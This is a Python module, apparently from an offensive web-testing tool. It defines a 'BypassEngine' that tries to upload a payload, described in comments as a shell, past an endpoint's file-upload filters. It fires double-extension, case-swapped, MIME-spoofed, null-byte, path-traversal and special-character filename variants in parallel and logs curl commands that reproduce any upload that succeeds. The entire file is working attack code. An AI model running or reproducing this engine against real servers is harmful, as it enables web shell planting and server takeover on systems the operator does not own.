from rich.console import Console

console = Console()

from rich.console import Console
import concurrent.futures

console = Console()

class BypassEngine:
    def __init__(self, http_client):
        self.client = http_client
        
    def _execute_strategy(self, endpoint, field, filename, content, mime, strategy_name):
        """
        Helper to execute a single strategy.
        """
        try:
            # console.print(f"[dim]    Trying {strategy_name}: {filename} | {mime}[/dim]")
            files = {field: (filename, content, mime)}
            resp = self.client.post(endpoint, files=files)
            
            status = "FAILED"
            success = False
            if resp and 200 <= resp.status_code < 300:
                status = "SUCCESS"
                success = True
                console.print(f"    [green][!] Upload Success: {strategy_name} ({filename})[/green]")
            else:
                pass
                # console.print(f"    [dim][-] Failed: {strategy_name} ({resp.status_code if resp else 'Err'})[/dim]")
            
            # Generate curl command for reproduction
            curl_cmd = f"curl -X POST {endpoint} -F '{field}=@{filename};type={mime}'"
            
            return {
                "strategy": strategy_name,
                "filename": filename,
                "mime": mime,
                "status_code": resp.status_code if resp else 0,
                "success": success,
                "response": resp,
                "curl_command": curl_cmd
            }
        except Exception as e:
            console.print(f"    [red][!] Error in {strategy_name}: {e}[/red]")
            return None

    def run_attack(self, endpoint, field, payload_name, payload_content, original_filename, strategy="all"):
        console.print(f"[blue][*] Starting MAX LEVEL attack on {endpoint} with {payload_name}[/blue]")
        
        strategies = []
        base, ext = original_filename.rsplit('.', 1) if '.' in original_filename else (original_filename, "")
        
        # 1. Double Extensions
        strategies.append(("Double Ext (.jpg)", f"{original_filename}.jpg", "image/jpeg"))
        strategies.append(("Double Ext (.png)", f"{original_filename}.png", "image/png"))
        
        # 2. Case Sensitivity
        strategies.append(("Case Sensitive", f"{base}.{ext.swapcase()}", "application/octet-stream"))
        
        # 3. MIME Spoofing
        strategies.append(("MIME Spoofing (image/jpeg)", original_filename, "image/jpeg"))
        strategies.append(("MIME Spoofing (image/png)", original_filename, "image/png"))
        
        # 4. Null Byte Injection (Old PHP/Java)
        strategies.append(("Null Byte Injection", f"{original_filename}%00.jpg", "image/jpeg"))
        
        # 5. Path Traversal Filenames
        strategies.append(("Path Traversal (../)", f"../{original_filename}", "application/octet-stream"))
        strategies.append(("Path Traversal (..\\)", f"..\\{original_filename}", "application/octet-stream"))
        
        # 6. Special Characters
        strategies.append(("Special Char (;)", f"{base};.jpg", "image/jpeg"))
        strategies.append(("Special Char (:)", f"{base}:.jpg", "image/jpeg"))
        
        # 7. Apache .htaccess (if payload is text)
        # This is usually a separate payload type, but we can try to rename our shell to .htaccess if user allows
        # For now, we skip specific .htaccess logic here to keep it generic.

        results = []
        
        # Run in parallel with ThreadPool
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for name, fname, mime in strategies:
                futures.append(executor.submit(self._execute_strategy, endpoint, field, fname, payload_content, mime, name))
            
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res:
                    results.append(res)
                
        return results
